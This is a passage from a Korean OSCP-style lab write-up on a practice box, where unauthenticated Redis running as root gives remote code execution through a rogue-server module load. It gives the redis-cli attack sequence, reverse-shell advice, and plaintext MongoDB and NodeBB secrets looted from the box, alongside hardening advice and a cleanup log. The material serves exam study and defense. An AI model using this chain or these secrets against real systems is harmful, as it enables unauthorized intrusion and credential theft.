## 7. OSCP 시험 관점

1. **`redis-rogue-server.py`는 허용된다.** 표준의 금지 정의는 "**스스로 취약점을 발견해** 자동 익스플로잇하는" 도구다. 이건 **단일 취약점(Redis 모듈 로드 RCE) PoC**라 발견 단계가 없다 — exploit-db/GitHub PoC와 같은 지위로 허용된다.
2. **Metasploit 대안을 일부러 쓰지 않았다.** `exploit/linux/redis/redis_replication_cmd_exec`가 같은 기법을 자동화하지만, 시험에서 **Metasploit은 1대에만** 쓸 수 있다. 수동 PoC로 충분한 이 박스에 그 카드를 쓰는 건 낭비 — **아꼈다.** 이 판단 자체가 시험 전략이다.
3. **수동 대안을 반드시 손에 익혀라.** 3-2의 순수 `redis-cli` 절차(`slaveof`→`config set dbfilename`→`module load`→`system.exec`)는 스크립트가 막힐 때의 생명줄이다.
4. **플래그 증거는 대화형 셸에서.** `system.exec`는 비대화형이라 그것으로 읽은 플래그는 **웹셸 취급 = 0점**([[Butch]]). 시험이라면 `system.rev`로 리버스셸을 잡아 `whoami; hostname; ip a; cat proof.txt`를 한 화면에.
5. **아웃바운드가 막히면 포트를 바꿔 tcpdump로 확인.** 이 박스는 :80만, [[Hawat]]는 :443만 허용이었다. **connect-back이 안 잡히면 "egress 전면 차단"으로 단정하지 말고 어느 포트가 열렸는지 스윕**하라.
6. **에러의 계층을 판정하라.** `errno 98 Address already in use`는 원격이 아니라 **로컬 bind** 실패다. 같은 포트를 비우고 재시도가 정답이었다.
7. **시간 배분** — 익스플로잇 5분, egress 진단에 나머지. 만약 시험이라면 "connect-back이 여러 포트에서 안 온다"를 관측한 시점에 **즉시 포트 스윕(tcpdump + 여러 리스너)**으로 전환했어야 헤매지 않았다. cron/authorized_keys 대체 경로를 파기 전에 egress부터 확정하는 게 순서였다.

> [!note] 부수 수집물 — 왜 의미 있는가
> `/opt/nodebb/config.json`(root로 읽음)에서 MongoDB 자격증명 `nodebb:6ee2d89219d3d7af7f7666e483ffaed4`와 NodeBB secret `1bd93731-233b-4116-843a-3d66404e402f`를 얻었다(`nodebb_mongo_creds.txt`). **이 박스에선 불필요**했다(이미 root). 하지만 27017 MongoDB가 익명 접근을 거부했던 것을 떠올리면(1-2), 이 자격증명은 **피벗 시나리오에서 결정적**이다 — MongoDB에 인증 접속해 NodeBB 사용자 해시를 덤프하거나 관리자 세션을 위조(secret)하는 경로. 자격증명은 당장 안 써도 **줍는다.**

---

## 8. 방어 관점

- **Redis를 인터넷/신뢰 경계 밖에 노출하지 마라.** `bind 127.0.0.1` + 방화벽. 원격 접근이 필요하면 SSH 터널/VPN 뒤에 둔다.
- **`requirepass`(AUTH) 설정 + protected-mode 유지.** 강한 비밀번호를 걸면 무인증 명령 실행이 원천 차단된다.
- **위험 명령을 `rename-command`로 무력화.** `rename-command CONFIG ""`, `MODULE ""`, `SLAVEOF ""`로 익스플로잇에 필요한 명령을 제거하면 이 경로 전체가 닫힌다.
- **Redis를 root로 돌리지 마라.** 전용 저권한 계정(`redis`)으로 구동하면 설령 모듈 로드가 성사돼도 root RCE가 아니다 — 피해가 계정 권한으로 한정된다. **이 박스의 치명상은 root 구동이었다.**
- **egress 필터링은 방어가 되지만 완전하지 않다.** :80만 열어도 그 포트로 C2/리버스셸이 나간다. 아웃바운드 최소화 + 프록시 강제가 더 낫다.
- **MongoDB·NodeBB 자격증명을 평문 config에 두고 root 가독으로 방치하지 마라** — 침해 후 횡적 이동의 재료가 된다.

---

## 9. 참고 자료

- Redis 모듈 로드 RCE PoC: `github.com/n0b0dyCN/redis-rogue-server` (디스크: `~/PG/Wombo/rrs/`)
- 원 기법: "Redis post-exploitation" (ZeroNights 2018)
- CVE-2022-0543 — Debian/Ubuntu 패키지판 Redis Lua 샌드박스 탈출 (**이 박스엔 미적용** — 소스 컴파일본)
- Metasploit(참고, 미사용): `exploit/linux/redis/redis_replication_cmd_exec`
- Redis 보안 문서: protected-mode, `rename-command`, `requirepass`

## 남긴 흔적 / 정리

총괄이 검증 후 정리했다:
- **직접 확인함**: `module unload system` · `slaveof no one` · `config set dir /` · `config set dbfilename dump.rdb` 복구 · `exp.so` 삭제 · tmux 세션 명명 종료.
- `[가정]` 이전 단계에서 에이전트가 제거한 마커(재확인하지 못한 항목): `/etc/cron.d/{zz,pwnjob}` · `/var/spool/cron/crontabs/root` · `/var/www/html/*.txt` 진단용 파일. `writeup_notes.txt`에 "제거 완료·webroot+cron.d clean 확인"으로 적혀 있으나 총괄이 사후에 직접 재확인하지는 않았다.
- Redis 상태는 `role master` / `dir /` / `dbfilename dump.rdb`로 원복 확인됨.

## 관련 노트

- [[Squid]] — **실패 원인을 계층으로 분리하라**. 그쪽은 `certutil` 성공 배너를 믿은 오독, 이쪽은 `errno 98`을 원격 방화벽으로 오독. 같은 계열의 함정.
- [[Butch]] — **웹셸/비대화형으로 읽은 플래그는 OSCP 0점**. `system.exec`도 같은 지위라 시험이라면 `system.rev` 리버스셸 필요.
- [[Hawat]] — **아웃바운드 포트 제한**. 그쪽은 :443만, 이쪽은 :80만 허용. "connect-back이 안 잡히면 egress 전면 차단으로 단정하지 마라"의 누적 사례.
- 누적 패턴 "아웃바운드가 막히면 무엇을 의심하나": [[Hawat]](443) · [[Squid]](프록시 경유) · **Wombo**(80).
